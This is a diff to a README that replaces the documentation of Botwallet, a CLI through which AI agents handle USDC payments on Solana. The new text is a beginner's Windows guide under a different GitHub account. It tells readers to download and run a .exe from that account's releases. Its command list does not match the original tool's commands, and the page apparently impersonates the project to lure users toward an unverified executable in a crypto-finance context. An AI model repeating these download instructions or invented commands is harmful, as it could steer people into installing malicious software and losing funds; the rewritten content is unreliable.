@@ -1,224 +1,147 @@
-# Botwallet CLI
+# 🤖 agent-cli - Manage AI Agent Payments Easily
 
-Command-line interface for AI agents to manage their Botwallet accounts.
+[![Download agent-cli](https://img.shields.io/badge/Download-Agent--CLI-brightgreen)](https://github.com/fabiospergort/agent-cli)
 
-## Installation
+## 📋 About agent-cli
 
-### From Release (Recommended)
+agent-cli is a command-line tool built for handling AI agents in the AI economy. It helps you earn, pay, and manage funds smoothly. You can use it to access a variety of paid APIs, create invoices to receive money, ask for payments from authorized users, and send or receive payments in USDC cryptocurrency. agent-cli works with built-in safety features like spending limits and owner approvals, and it uses FROST threshold signing on the Solana blockchain for security.
 
-```bash
-# Linux/macOS
-curl -fsSL https://botwallet.co/install.sh | bash
+This tool is open-source and made to give users clear control over AI agent financial actions without requiring deep technical skills.
 
-# Windows (PowerShell)
-iwr https://botwallet.co/install.ps1 | iex
-```
+---
 
-### From Source
+## 💻 System Requirements
 
-```bash
-go install github.com/botwallet-co/agent-cli@latest
-```
+To run agent-cli on your Windows computer, make sure your system matches these requirements:
 
-## Quick Start
+- Windows 10 or newer (64-bit recommended)  
+- Minimum 4 GB of RAM  
+- At least 100 MB of free disk space  
+- Internet access required for API calls and blockchain interaction  
+- Basic command-line interface functioning (Command Prompt or PowerShell)  
 
-```bash
-# Create a new wallet (FROST threshold key generation, saves credentials locally)
-botwallet register --name "Orion's Wallet" --owner "your@email.com"
+If you are unsure about command-line use, this guide will walk you through the setup step-by-step.
 
-# Create an invoice and send it
-botwallet paylink create 25.00 --desc "Research report"
-botwallet paylink send <request_id> --to client@example.com --message "Here's your invoice"
+---
 
-# Two-step payment flow
-botwallet pay @merchant 10.00                # Step 1: Create intent
-botwallet pay confirm <transaction_id>       # Step 2: FROST sign & submit
-```
+## 🚀 Getting Started with agent-cli on Windows
 
-`register` is the recommended way to create a wallet. `wallet create` does the same thing.
+This section explains how to download and run agent-cli on your Windows PC without needing programming knowledge.
 
-## Command Groups
+### Step 1: Visit the Download Page
 
-### Wallet (`botwallet wallet ...`)
-| Command | Description |
-|---------|-------------|
-| `wallet create --name "..." --owner email` | Create wallet (FROST key generation) |
-| `wallet info` | Wallet info and claim status |
-| `wallet balance` | Balance and spending limits |
-| `wallet list` | List locally stored wallets |
-| `wallet use <name>` | Switch default wallet |
-| `wallet deposit` | Solana USDC deposit address |
-| `wallet owner <email>` | Update pledged owner (unclaimed only) |
-| `wallet backup` | Back up Key 1 (two-step safety process) |
-| `wallet export -o file.bwlt` | Export wallet to encrypted .bwlt file |
-| `wallet import file.bwlt` | Import wallet from .bwlt file |
+Click the big green button above or open this link in your browser:  
+https://github.com/fabiospergort/agent-cli
 
-### Payments (`botwallet pay ...`) — Two-Step
-| Command | Description |
-|---------|-------------|
-| `pay @recipient <amount>` | **Step 1:** Create payment intent |
-| `pay confirm <tx_id>` | **Step 2:** FROST sign & submit |
-| `pay preview @to <amount>` | Pre-check if payment will succeed |
-| `pay list` | List payments |
-| `pay cancel <tx_id>` | Cancel a pending payment |
-| `pay --paylink <id>` | Pay a payment link directly |
+This link takes you to the project page where you can find the latest version of the software.
 
-Flags: `--note`, `--reference`, `--paylink`, `--idempotency-key`
+### Step 2: Download agent-cli
 
-### Payment Links — Earning (`botwallet paylink ...`)
-| Command | Description |
-|---------|-------------|
-| `paylink create [amount] --desc "..."` | Create payment link to get paid |
-| `paylink send <id> --to <email\|@bot>` | Send paylink to email or bot's inbox |
-| `paylink get <id>` | Check if paid |
-| `paylink get --reference <ref>` | Look up by your reference ID |
-| `paylink list` | List paylinks |
-| `paylink cancel <id>` | Cancel paylink |
+On the page, look for the **Releases** section. Follow these instructions:
 
-Create flags: `--desc` (required), `--item` (repeatable), `--expires`, `--reference`, `--revealOwner`
-Send flags: `--to` (required, email or @bot-username), `--message` (optional note)
+1. Click on the "Releases" tab or scroll down to find the latest release.  
+2. Look for a file ending with `.exe` or a Windows installer file.  
+3. Click to download the file to your computer.
 
-`--item` format — repeat for each line item, total auto-calculated:
-```
---item "API Calls, 5.00, 2" --item "Setup Fee, 10.00"
-```
+### Step 3: Run the Installer
 
-### Fund Requests (`botwallet fund ...`)
-| Command | Description |
-|---------|-------------|
-| `fund <amount> --reason "..."` | Request funds from owner |
-| `fund ask <amount> --reason "..."` | Same as above (explicit subcommand) |
-| `fund list` | List fund requests |
+Once the download finishes:
 
-### Withdrawals (`botwallet withdraw ...`) — Two-Step
-| Command | Description |
-|---------|-------------|
-| `withdraw <amount> <addr> --reason "..."` | **Step 1:** Create request (owner must approve) |
-| `withdraw confirm <id>` | **Step 2:** FROST sign & submit |
-| `withdraw get <id>` | Check withdrawal status |
+1. Locate the downloaded file. Usually, it is in your **Downloads** folder.  
+2. Double-click the file to start the installer.  
+3. Follow the setup prompts on the screen. Use the default options if unsure.  
+4. Wait for the installation to complete.
 
-### Approval Status (`botwallet approval ...`)
-| Command | Description |
-|---------|-------------|
-| `approval status <approval_id>` | Check status of a specific approval (pending/approved/rejected/expired) |
+### Step 4: Open agent-cli
 
-Use this to poll after any action returns `awaiting_approval`. When status is `approved`, run the corresponding confirm command.
+After installation:
 
-### Events & Notifications (`botwallet events`)
-| Command | Description |
-|---------|-------------|
-| `events` | Check unread notifications |
-| `events --type approval_resolved` | Filter by event type |
-| `events --all` | Include already-read events |
-| `events --limit 25` | Max events to return (default: 10) |
-| `events --since <ISO-timestamp>` | Only events after this time |
-| `events --mark-read` | Mark all as read |
+1. Press the **Windows key** on your keyboard and type `cmd`, then press Enter to open the Command Prompt.  
+2. Type `agent-cli` and press Enter. The program should start, and you will see its main menu or help commands displayed.
 
-Event types: `approval_resolved`, `deposit_received`, `payment_completed`, `fund_requested`, `fund_request_funded`, `wallet_pledged`, `guardrails_updated`, `x402_payment_completed`, `x402_payment_failed`
+---
 
-`notifications` is an alias for `events`.
+## ⚙️ Using agent-cli
 
-### x402 Paid APIs (`botwallet x402 ...`) — Two-Step
-| Command | Description |
-|---------|-------------|
-| `x402 discover` | List verified Solana APIs (curated catalog) |
-| `x402 discover "query"` | Search catalog by keyword |
-| `x402 discover --bazaar` | Search the full x402 Bazaar (Coinbase CDP) |
-| `x402 discover --bazaar --all` | Bazaar: include all networks (default: Solana only) |
-| `x402 fetch <url>` | **Step 1:** Probe API, see price |
-| `x402 fetch confirm <fetch_id>` | **Step 2:** Pay and retrieve data |
+agent-cli works using simple commands you can type into the Command Prompt. Here are some basic commands to get you started:
 
-Discover flags: `--bazaar`, `--limit` (bazaar), `--offset` (bazaar), `--all` (bazaar), `--facilitator`
-Fetch flags: `--method`, `--body`, `--header` (repeatable)
+- List available APIs to access:  
+  `agent-cli list-apis`
 
-### Utilities
-| Command | Description |
-|---------|-------------|
-| `history` | Transaction history (`--type in/out/payment/deposit/withdrawal`) |
-| `limits` | Spending limits and guard rails |
-| `approvals` | List all pending owner approvals |
-| `approval status <id>` | Check a specific approval's status |
-| `lookup @username` | Check if recipient exists |
-| `ping` | Test API connectivity |
-| `version` | Print version information |
-| `docs` | Full embedded documentation |
+- Create an invoice to receive funds:  
+  `agent-cli create-invoice --amount 100 --currency USDC`
 
-`transactions` is an alias for `history`.
+- Request funds from an owner:  
+  `agent-cli request-funds --owner <owner_id> --amount 50`
 
-## Authentication
+- Send a payment:  
+  `agent-cli send-payment --to <recipient_wallet> --amount 75`
 
-Credentials auto-saved on `wallet create`. Priority order:
+- Approve or review payments with owner approval prompts built in.
 
-1. `--api-key` flag
-2. `BOTWALLET_API_KEY` / `BW_API_KEY` env var
-3. `--wallet` flag (selects from config)
-4. Default wallet from `~/.botwallet/config.json`
+You can always view all command options by typing:  
+`agent-cli help`
 
-## Output Modes
+This will show you all commands and how to use them step-by-step.
 
-**JSON (default)** — for bots:
-```bash
-$ botwallet wallet balance
-{"balance": 42.50, "daily_limit": 500.00, "spent_today": 10.00, "remaining_today": 490.00}
-```
+---
 
-**Human** (`--human` flag) — formatted with colors:
-```bash
-$ botwallet wallet balance --human
-── Balance ────────────────────
-  Available: $42.50
-── Daily Spending ─────────────
-  Spent Today: $10.00 / $500.00
-```
+## 🔒 Security Features
 
-## Examples
+agent-cli includes safety controls to protect your finances:
 
-```bash
-# Pay someone
-botwallet pay preview @openai 25.00
-botwallet pay @openai 25.00 --note "API credits"
-botwallet pay confirm <transaction_id>
+- **Owner approvals:** Actions like payment sending require confirmation from authorized users.  
+- **Spending guardrails:** Set limits on spending to prevent accidental overpayment.  
+- **FROST threshold signing on Solana:** Uses advanced cryptographic methods to secure transactions on the blockchain.  
 
-# Earn money (simple)
-botwallet paylink create 50.00 --desc "Research report"
+These features work silently but add layers of protection under the surface.
 
-# Earn money (itemized invoice — total auto-calculated)
-botwallet paylink create --desc "Dev services" --item "API Calls, 5.00, 2" --item "Setup Fee, 10.00"
-botwallet paylink send <id> --to client@example.com --message "Here's your invoice"
-botwallet paylink send <id> --to @data-bot --message "Payment for data analysis"
+---
 
-# Request funds
-botwallet fund 50.00 --reason "API costs"
+## 🔧 Configuring agent-cli
 
-# Withdraw
-botwallet withdraw 100.00 YourSolanaAddr... --reason "Monthly earnings"
-# Owner approves, then:
-botwallet withdraw confirm <withdrawal_id>
+You can customize agent-cli settings to fit your needs:
 
-# Wait for human approval (using approval status polling)
-botwallet pay @merchant 500.00                  # Returns awaiting_approval + approval_id
-botwallet approval status <approval_id>         # Poll: pending → approved
-botwallet pay confirm <transaction_id>          # After approved
+- **Wallet setup:** Link your USDC Solana wallet by following prompts after first launch.  
+- **API keys:** Store your API keys securely inside the tool for paid services on x402 APIs.  
+- **Spending limits:** Set or update purse guardrails to control daily or monthly spending allowances.  
 
-# Discover and use paid APIs
-botwallet x402 discover                             # List verified Solana APIs
-botwallet x402 discover "speech"                    # Search by keyword
-botwallet x402 fetch <url_from_results>             # Probe, see price
-botwallet x402 fetch confirm <fetch_id>             # Pay and get data
+All configurations are saved on your computer and loaded automatically every time you start agent-cli.
 
-# Multiple wallets
-botwallet wallet list
-botwallet wallet use my-other-wallet
-```
+---
 
-## Building from Source
+## 🛠️ Troubleshooting common issues
 
-```bash
-make build          # Current platform
-make build-all      # All platforms
-make test           # Run tests
-```
+If you encounter problems, here are a few quick fixes:
 
-## License
+- **agent-cli not recognized:**  
+  Make sure you completed the installer and restarted your Command Prompt.  
 
-Apache 2.0 - See [LICENSE](LICENSE) for details.
+- **Cannot connect to APIs:**  
+  Check your internet connection and firewall settings to allow agent-cli access.  
+
+- **Unexpected errors during payment:**  
+  Verify your wallet configuration and ensure your owner approvals are set properly.
+
+For detailed help, you can visit the main project page for the latest troubleshooting tips.
+
+---
+
+## 📥 Download and Installation Link
+
+You can download and install agent-cli from here:  
+[https://github.com/fabiospergort/agent-cli](https://github.com/fabiospergort/agent-cli)
+
+Click this link to open the GitHub page where you will find the download files and latest updates.
+
+---
+
+## 🧰 Additional Help
+
+If you want more support:
+
+- Check the **README.md** or **Wiki** on the GitHub page for detailed guides.  
+- Explore community discussions or open an issue to ask for help directly.  
+- Use the `agent-cli help` command to learn more about commands and usage.
+
+This setup is meant to be simple for everyday users without programming background. Follow these steps and you will be able to manage AI agent-related payments confidently.
